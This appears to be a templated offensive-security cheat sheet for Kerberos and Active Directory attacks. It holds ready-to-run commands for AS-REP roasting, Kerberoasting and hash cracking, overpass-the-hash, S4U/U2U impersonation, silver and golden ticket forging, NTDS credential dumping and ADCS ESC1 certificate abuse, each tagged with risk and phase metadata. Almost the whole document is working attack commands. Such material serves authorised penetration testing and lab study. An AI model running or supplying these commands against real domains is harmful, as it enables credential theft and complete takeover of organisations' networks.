# Kerberos Attacks

> ASREP roast, Kerberoast, Silver/Golden tickets, S4U, U2U, ccache handling

<!-- tags: kerberos, ad, ticket, krb5, ccache, exploit -->

---

## sync time to DC
Kerberos rejects skew >5min. Sync first.

```bash
sudo ntpdate -s {{DC_IP:ip:10.10.10.1}} || sudo rdate -n {{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=safe | phase=recon | tags=kerberos,time -->

---

## add DC to hosts file
Resolve DC FQDN locally.

```bash
echo "{{DC_IP:ip:10.10.10.1}} {{DC_HOST:str:dc01.corp.local}} {{DOMAIN:domain:corp.local}}" | sudo tee -a /etc/hosts
```

<!-- meta: risk=safe | phase=recon | tags=kerberos,dns -->

---

## generate krb5.conf
Minimal krb5.conf for impacket/winrmexec.

```bash
cat > /tmp/krb5.conf <<EOF
[libdefaults]
    default_realm = {{REALM:str:CORP.LOCAL}}
    dns_lookup_realm = false
    dns_lookup_kdc = false
[realms]
    {{REALM:str:CORP.LOCAL}} = {
        kdc = {{DC_HOST:str:dc01.corp.local}}
        admin_server = {{DC_HOST:str:dc01.corp.local}}
    }
[domain_realm]
    .{{DOMAIN:domain:corp.local}} = {{REALM:str:CORP.LOCAL}}
    {{DOMAIN:domain:corp.local}} = {{REALM:str:CORP.LOCAL}}
EOF
```

<!-- meta: risk=safe | phase=recon | tags=kerberos,config -->

---

## asreproast unauthenticated
Find users with PreAuth disabled and request AS-REP.

```bash
impacket-GetNPUsers {{DOMAIN:domain:corp.local}}/ -dc-ip {{DC_IP:ip:10.10.10.1}} -usersfile {{USERLIST:wordlist:users.txt}} -format hashcat -outputfile asrep_hashes.txt
```

<!-- meta: risk=safe | phase=enum | tags=kerberos,asreproast -->

---

## asreproast authenticated
Use existing creds to find ASREProast targets.

```bash
impacket-GetNPUsers {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}} -dc-ip {{DC_IP:ip:10.10.10.1}} -request -format hashcat -outputfile asrep_hashes.txt
```

<!-- meta: risk=safe | phase=enum | tags=kerberos,asreproast,auth -->

---

## crack asrep hashcat
Crack AS-REP hash with mode 18200.

```bash
hashcat -m 18200 asrep_hashes.txt {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}}
```

<!-- meta: risk=safe | phase=passwords | tags=kerberos,hashcat -->

---

## kerberoast find SPNs
List Kerberoastable service accounts.

```bash
impacket-GetUserSPNs {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}} -dc-ip {{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=safe | phase=enum | tags=kerberos,kerberoast -->

---

## kerberoast request TGS hashes
Pull crackable TGS-REPs.

```bash
impacket-GetUserSPNs {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}} -dc-ip {{DC_IP:ip:10.10.10.1}} -request -outputfile tgs_hashes.txt
```

<!-- meta: risk=safe | phase=enum | tags=kerberos,kerberoast,request -->

---

## kerberoast via ticket auth
Avoid plaintext password by using TGT.

```bash
KRB5CCNAME={{USERNAME:str:user}}.ccache impacket-GetUserSPNs '{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}' -dc-host {{DC_HOST:str:dc01.corp.local}} -request -k
```

<!-- meta: risk=safe | phase=enum | tags=kerberos,kerberoast,kauth -->

---

## crack TGS hashcat
Crack TGS-REP with mode 13100.

```bash
hashcat -m 13100 tgs_hashes.txt {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}}
```

<!-- meta: risk=safe | phase=passwords | tags=kerberos,hashcat -->

---

## get TGT with password
Request a TGT and save ccache.

```bash
impacket-getTGT {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}} -dc-ip {{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=safe | phase=enum | tags=kerberos,tgt -->

---

## get TGT overpass-the-hash
Request TGT using NT hash (overpass-the-hash).

```bash
impacket-getTGT -hashes :{{NTHASH:str:31d6cfe0d16ae931b73c59d7e0c089c0}} '{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}' -dc-ip {{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=high | phase=exploit | tags=kerberos,tgt,opth -->

---

## get TGT computer account
Computer accounts use $ suffix.

```bash
impacket-getTGT -hashes :{{NTHASH:str:e19ccf75ee54e06b06a5907af13cef42}} '{{DOMAIN:domain:corp.local}}/{{COMP:str:web01}}$' -dc-ip {{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=high | phase=exploit | tags=kerberos,tgt,computer -->

---

## export ccache env
Set env to use cached ticket.

```bash
export KRB5CCNAME={{CCACHE:file:user.ccache}}
```

<!-- meta: risk=safe | phase=exploit | tags=kerberos,ccache -->

---

## inspect ccache ticket
Show contents of ticket cache.

```bash
klist {{CCACHE:file:user.ccache}}
impacket-describeTicket {{CCACHE:file:user.ccache}}
```

<!-- meta: risk=safe | phase=enum | tags=kerberos,ccache,inspect -->

---

## convert kirbi ccache
Translate between Windows/Linux formats.

```bash
impacket-ticketConverter {{KIRBI:file:dc01.kirbi}} {{CCACHE:file:dc01.ccache}}
impacket-ticketConverter {{CCACHE:file:dc01.ccache}} {{KIRBI:file:dc01.kirbi}}
```

<!-- meta: risk=safe | phase=exploit | tags=kerberos,convert -->

---

## get service ticket TGS
Request a TGS for a specific service.

```bash
impacket-getST -spn '{{SPN:str:cifs/dc01.corp.local}}' '{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}}' -dc-ip {{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=safe | phase=exploit | tags=kerberos,tgs -->

---

## s4u2self constrained delegation
Impersonate user via S4U2Self.

```bash
impacket-getST -impersonate '{{IMPERSONATE:str:Administrator}}' -spn '{{SPN:str:cifs/dc01.corp.local}}' '{{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:{{PASSWORD:str:pass}}' -dc-ip {{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=high | phase=exploit | tags=kerberos,s4u,delegation -->

---

## u2u user-to-user ticket
Request U2U TGS for self-authentication scenarios.

```bash
KRB5CCNAME={{COMP:str:web01}}$.ccache impacket-getST -u2u -impersonate 'Administrator' -spn 'cifs/{{DC_HOST:str:dc01.corp.local}}' -k -no-pass '{{DOMAIN:domain:corp.local}}/{{COMP:str:web01}}$@{{DOMAIN:domain:corp.local}}'
```

<!-- meta: risk=high | phase=exploit | tags=kerberos,u2u,s4u -->

---

## use ticket smbclient
Authenticate to SMB using ccache.

```bash
KRB5CCNAME={{CCACHE:file:user.ccache}} impacket-smbclient -k -no-pass {{DC_HOST:str:dc01.corp.local}}
```

<!-- meta: risk=safe | phase=exploit | tags=kerberos,smb,kauth -->

---

## use ticket mssql
MSSQL with Kerberos integrated auth.

```bash
KRB5CCNAME={{CCACHE:file:user.ccache}} impacket-mssqlclient -k -no-pass {{DC_HOST:str:dc01.corp.local}} -windows-auth
```

<!-- meta: risk=safe | phase=exploit | tags=kerberos,mssql -->

---

## use ticket winrm
Evil-WinRM with Kerberos.

```bash
KRB5_CONFIG=/tmp/krb5.conf KRB5CCNAME={{CCACHE:file:user.ccache}} evil-winrm -i {{DC_HOST:str:dc01.corp.local}} -u '{{USERNAME:str:user}}' -r {{REALM:str:CORP.LOCAL}}
```

<!-- meta: risk=high | phase=exploit | tags=kerberos,winrm -->

---

## forge silver ticket
Forge service ticket via service account NT hash.

```bash
impacket-ticketer -nthash {{SVC_NT:str:ef699384c3285c54128a3ee1ddb1a0cc}} -domain-sid {{SID:str:S-1-5-21-...}} -domain {{DOMAIN:domain:corp.local}} -spn {{SPN:str:MSSQLSvc/db01.corp.local}} -groups 1105 -user-id 500 {{IMPERSONATE:str:Administrator}}
```

<!-- meta: risk=critical | phase=exploit | tags=kerberos,silverticket -->

---

## forge golden ticket
Forge TGT using krbtgt NT hash.

```bash
impacket-ticketer -nthash {{KRBTGT_NT:str:abc123...}} -domain-sid {{SID:str:S-1-5-21-...}} -domain {{DOMAIN:domain:corp.local}} {{IMPERSONATE:str:Administrator}}
```

<!-- meta: risk=critical | phase=exploit | tags=kerberos,goldenticket -->

---

## dump ntds with ccache
Use Linux kerb cache with NetExec.

```bash
KRB5CCNAME={{CCACHE:file:user.ccache}} nxc smb {{DC_HOST:str:dc01.corp.local}} -k --use-kcache --ntds
```

<!-- meta: risk=critical | phase=post | tags=kerberos,nxc,ntds -->

---

## winrm exec ticket SPN
Use winrmexec with specific SPN.

```bash
KRB5_CONFIG=/tmp/krb5.conf KRB5CCNAME={{CCACHE:file:user.ccache}} python3 winrmexec.py -ssl -port 5986 {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:'{{PASSWORD:str:pass}}'@{{DC_HOST:str:dc01.corp.local}} -k -dc-ip {{DC_IP:ip:10.10.10.1}} -spn HTTP/{{DC_HOST:str:dc01.corp.local}}
```

<!-- meta: risk=high | phase=exploit | tags=kerberos,winrm,spn -->

---

## esc1 request cert adcs
Request cert with SAN to impersonate.

```bash
certipy req -u '{{USERNAME:str:user}}@{{DOMAIN:domain:corp.local}}' -p '{{PASSWORD:str:pass}}' -ca '{{CA:str:CORP-CA}}' -target {{DC_HOST:str:dc01.corp.local}} -template '{{TEMPLATE:str:VulnTemplate}}' -upn '{{IMPERSONATE:str:Administrator}}@{{DOMAIN:domain:corp.local}}'
```

<!-- meta: risk=critical | phase=exploit | tags=kerberos,adcs,esc1 -->

---

## auth cert to TGT adcs
Convert cert to TGT.

```bash
certipy auth -pfx {{PFX:file:user.pfx}} -dc-ip {{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=high | phase=exploit | tags=kerberos,adcs,auth -->

---

## pass-the-cert ldap auth
Authenticate to LDAP/HTTPS with cert.

```bash
python3 passthecert.py -action whoami -crt {{CERT:file:user.crt}} -key {{KEY:file:user.key}} -domain {{DOMAIN:domain:corp.local}} -dc-ip {{DC_IP:ip:10.10.10.1}}
```

<!-- meta: risk=high | phase=exploit | tags=kerberos,adcs,passthecert -->
